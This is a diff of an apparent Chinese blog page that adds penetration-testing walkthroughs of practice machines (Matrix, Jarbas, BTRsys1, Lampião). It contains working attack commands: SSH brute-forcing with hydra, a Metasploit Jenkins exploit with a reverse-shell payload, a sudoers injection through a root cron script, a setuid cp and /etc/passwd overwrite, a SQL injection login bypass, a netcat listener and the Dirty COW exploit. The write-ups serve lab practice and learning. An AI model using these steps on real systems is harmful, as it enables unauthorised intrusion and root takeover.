@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-03</span>
-            <span class="time">03:23:08</span>
+            <span class="time">06:26:35</span>
           </span>
           
         </div>
@@ -108,7 +108,7 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          <p>一天一渗透,提升自己</p>
+          <p>保研希望渺茫,一天一渗透,提升自己</p>
 <a id="more"></a>
 <h1 id="covfefe渗透实战"><a href="#covfefe渗透实战" class="headerlink" title="covfefe渗透实战"></a>covfefe渗透实战</h1><p><code>nmap -sS -Pn -A -p- -n 192.168.8.139</code><br>首先扫描网段 nmap -sn xxxx/24<br>扫可疑端口目录<br>ssh 可以 用私钥登陆 与服务器上的公钥进行认证 认证成功就登陆<br><code>ssh -i 私钥文件 用户名@ip</code><br>扫目录有的为了寻找ssh的私钥文件 私钥有的带密码 需要进一步破解<br>找到文件后需要赋予权限 chmod 600(只有拥有者有读写权限。)<br> 查看<br> <code>ls -alh</code><br> 破解私钥文件密码<br><code>locate ssh2john</code><br><code>python 路径名.py 私钥文件&gt;isacrack</code><br><code>john isacrack</code><br>破解密码成功<br>进入ssh控制 cd /root 进入root目录<br>最重要的是提权,这里介绍溢出提权<br>首先要找到以目前的权限能够执行的文件<br><code>find / -perm -4000 2&gt;/dev/null</code><br>c文件 溢出关键函数 比较<br>int strncmp(str1,str2,n)<br>参数<br>    str1 – 要进行比较的第一个字符串。<br>    str2 – 要进行比较的第二个字符串。<br>    n – 要比较的最大字符数。<br>返回值<br>该函数返回值如下：<br>    如果返回值 &lt; 0，则表示 str1 小于 str2。<br>    如果返回值 &gt; 0，则表示 str2 小于 str1。<br>    如果返回值 = 0，则表示 str1 等于 str2。<br>例如这题中</p>
 <pre><code class="hljs undefined"><span class="hljs-keyword">char</span> a[]=<span class="hljs-string">"simon"</span>;
@@ -174,8 +174,56 @@ load=/uploaded_images/<span class="hljs-keyword">cmd</span>.<span class="bash">j
 <p>在wordpress的网站中我们可以发现用户名,决定尝试ssh登陆,至于密码我们在deet.txt中发现了<br>get flag<br><strong>总结</strong></p>
 <hr>
 <p>遇到wordpress的网站上的首先我们要扫目录,最重要的目标就是找到wp-config.php这里有数据库的账号密码,之后可以用几种姿势ssh<br>然后提权</p>
-<h1 id="Machine-Matrix渗透实战"><a href="#Machine-Matrix渗透实战" class="headerlink" title="Machine_Matrix渗透实战"></a>Machine_Matrix渗透实战</h1><p>老套路 扫主机和目录发现一些猫腻<br>进入31337端口 告诉你要解密,查看源代码有base64,去解码<br>告诉你文件存在一个Cypher.matrix,这是一个brainfuck(第一次见),解码方法存在主机上<br>然后告诉你账号密码,但密码后两位没有说,自己爆破吧,著名的黑客爆破工具pydictor<br><code>python3 pydictor.py -base dLc --len 2 2 --head k1ll0r</code><br>然后生成字典爆破ssh 用户名为guest<br><code>hydra -l guest -P base_141052.txt ssh://192.168.8.132</code><br>时间有点慢,大概爆了一分钟</p>
-<p>``</p>
+<h1 id="Machine-Matrix渗透实战"><a href="#Machine-Matrix渗透实战" class="headerlink" title="Machine_Matrix渗透实战"></a>Machine_Matrix渗透实战</h1><p>老套路 扫主机和目录发现一些猫腻<br>进入31337端口 告诉你要解密,查看源代码有base64,去解码<br>告诉你文件存在一个Cypher.matrix,这是一个brainfuck(第一次见),解码方法存在主机上<br>然后告诉你账号密码,但密码后两位没有说,自己爆破吧,著名的黑客爆破工具pydictor<br><code>python3 pydictor.py -base dLc --len 2 2 --head k1ll0r</code><br>然后生成字典爆破ssh 用户名为guest<br><code>hydra -l guest -P base_141052.txt ssh://192.168.8.132</code><br>时间有点慢,大概爆了一分钟<br>进入以后就是想办法提权<br><strong>rbash提权</strong><br>rbash就是一些平常的指令无法使用如ls,cd<br>我们使用命令来查看可以运行的指令<br><code>echo $PATH/*</code><br>发现有vi,我们输入<br>:!/bin/bash,进入权限,但发现还是不行<br>通常一些命令，可执行的二进制文件放在 bin , sbin , usr/bin , usr/sbin 目录下<br>我们要执行的莫过于sudo su<br>挨个试试<br><code>ls -al /bin/su</code><br><code>ls -al /usr/bin/sudo</code></p>
+<p>最后在如上两个目录中找到,找到这个能干什么呢?我们可以添加环境变量</p>
+<pre><code class="hljs undefined"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/usr/bin
+<span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/bin
+之后cd ~可以查看flag.txt</code></pre>
+
+<h1 id="jarbas渗透实战"><a href="#jarbas渗透实战" class="headerlink" title="jarbas渗透实战"></a>jarbas渗透实战</h1><p>这个是关于jenkins的渗透<br>正常扫目录,发现一个技巧<br><code>dirb xxxxx -X .html或.php</code>可以扫固定的后缀名<br>这是一个jenkins平台，Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台。<br>msf search jenkins<br>我在配置参数的室友遇到了麻烦<br>又时候不设置target 他默认的payload是windows下的<br>我们可以set targets 查看并配置</p>
+<pre><code class="hljs undefined">use exploit/multi/http/jenkins_script_console
+show <span class="hljs-keyword">options</span>
+<span class="hljs-keyword">set</span> target <span class="hljs-comment">1</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">USERNAME eder</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">PASSWORD vipsu</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">RHOST 10.211.55.16</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">RPORT 8080</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">TARGETURI</span> /
+show payloads 
+set payload linux/<span class="hljs-comment">x86</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.211.55.4</span>
+exploit</code></pre>
+
+<p><strong>利用定时技巧提权</strong><br>先转到shell桌面<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>whoami 查看当前用户名,对之后写脚本有用<br>查看定时执行命令<br><code>cat /etc/crontab</code><br>发现有个root权限的脚本sh<br>修改CleaningScript.sh内容，使它能够修改sudoers，给予当前用户jenkins免密码执行sudo的权限。<br>并利用crontab定时执行该任务<br><code>echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh</code><br>执行shell<br><code>sudo /bin/bash</code><br>cd ~ cat flag.txt<br>第二种姿势,这个也行,首先我们给cp 权限<br>我们要利用/tmp 所有用户可以访问的特点</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">cd</span> <span class="hljs-string">/etc/script/</span>             
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"chmod u+s /usr/bin/cp"</span> &gt; CleaningScript.sh</code></pre>
+
+<p>我们在我们的kali中伪造一个passwd,其中有我们自己的用户,上传到/tmp<br>构造自己的用户步骤如下:<br><code>openssl passwd -1 -salt disshu 123</code><br>该命令用于生成hash，-1表示用MD5基于BSD的密钥算法。用户名为disshu，密码是123<br>passwd的格式如下<br><code>disshu:生成的密码:0:0:root:/root:/bin/bash</code><br>在meterpreter&gt;中 upload /root/passwd /tmp<br>意思是将我们kali机伪造的passwd 上传到公用/tmp<br>执行shell命令<br>cp /tmp/passwd /etc/passwd(靶机的,不要弄混了)<br>su disshu<br>get flag~~</p>
+<h1 id="BTRsys1渗透实战"><a href="#BTRsys1渗透实战" class="headerlink" title="BTRsys1渗透实战"></a>BTRsys1渗透实战</h1><p>这个靶机难度适中<br>dirb 10.211.55.17 一下<br>但是没有什么有用的信息<br>dirb 10.211.55.17 -X .php<br>发现有登陆的界面 右击源代码 发现前端验证</p>
+<pre><code class="hljs undefined"><span class="hljs-built_in">var</span> str=user.<span class="hljs-built_in">substring</span>(user.lastIndexOf(<span class="hljs-string">"@"</span>)+<span class="hljs-number">1</span>,user.<span class="hljs-built_in">length</span>);
+<span class="hljs-keyword">if</span>((pwd == <span class="hljs-string">"'"</span>))&#123;
+    alert(<span class="hljs-string">"Hack Denemesi !!!"</span>); 
+&#125;
+<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (str!=<span class="hljs-string">"btrisk.com"</span>)&#123;
+    alert(<span class="hljs-string">"Yanlis Kullanici Bilgisi Denemektesiniz"</span>);</code></pre>
+
+<p>substring就是截取，从“@”符号后一位开始截取到输入的user账号的长度，即从@到结束；且str中必须是btrisk.com</p>
+<p>pwd很明显，直接随便构造一个注入</p>
+<pre><code class="hljs undefined">账号：<span class="hljs-number">123</span>@btrisk.com
+密码：' or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> -- -</code></pre>
+
+<p>上传反弹小马<br>kali<br><code>nc -lvp 4444</code><br>进去后pty一下,cat config.php<br>发现有数据库的账号密码登录后发现root的密码<br>直接su root即可</p>
+<h1 id="记一次-lampiao渗透（Drupal-脏牛提权）"><a href="#记一次-lampiao渗透（Drupal-脏牛提权）" class="headerlink" title="记一次 lampiao渗透（Drupal+脏牛提权）"></a>记一次 lampiao渗透（Drupal+脏牛提权）</h1><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日前所有发行版本）<br>所以uname -a 查看月份的时候即可看是否可以使用脏牛提权<br>打开kali apache<br>service apache2 start<br>在靶机上wget一下</p>
+<pre><code class="hljs undefined">g++ -Wall -pedantic -O2 -std=c++<span class="hljs-number">11</span> -pthread -o dirtycow dirtycow.cpp -lutil
+参数解释：
+<span class="hljs-number">1.</span> -Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告
+<span class="hljs-number">2.</span> -pedantic 允许发出ANSI/ISO C标准所列出的所有警告
+<span class="hljs-number">3.</span> -O2编译器的优化选项的<span class="hljs-number">4</span>个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
+<span class="hljs-number">4.</span> -std=c++<span class="hljs-number">11</span>就是用按C++<span class="hljs-number">2011</span>标准来编译的
+<span class="hljs-number">5.</span> -pthread 在Linux中要用到多线程时，需要链接pthread库
+<span class="hljs-number">6.</span> -o dcow gcc生成的目标文件,名字为dcow</code></pre>
+
+<p>./dcow -s运行</p>
 
         </div>
       </div>
